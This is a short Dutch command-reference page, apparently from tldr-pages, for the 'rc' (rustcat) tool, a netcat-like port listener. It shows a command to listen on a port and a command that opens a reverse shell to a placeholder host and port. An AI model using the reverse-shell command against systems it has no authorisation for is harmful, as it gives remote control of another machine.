<h1>rc</h1>

<blockquote><p>Een moderne simplistische poort luisteraar en omgekeerde shell.
Vergelijkbaar met <code>nc</code>.
Meer informatie: <a href="https://github.com/robiot/rustcat/wiki/Basic-Usage">https://github.com/robiot/rustcat/wiki/Basic-Usage</a>.</p></blockquote>

<ul>
<li>Start met luisteren op een specifieke poort:</li>
</ul>


<p><code>rc -lp {{poort}}</code></p>

<ul>
<li>Start een omgekeerde shell:</li>
</ul>


<p><code>rc {{host}} {{poort}} -r {{shell}}</code></p>
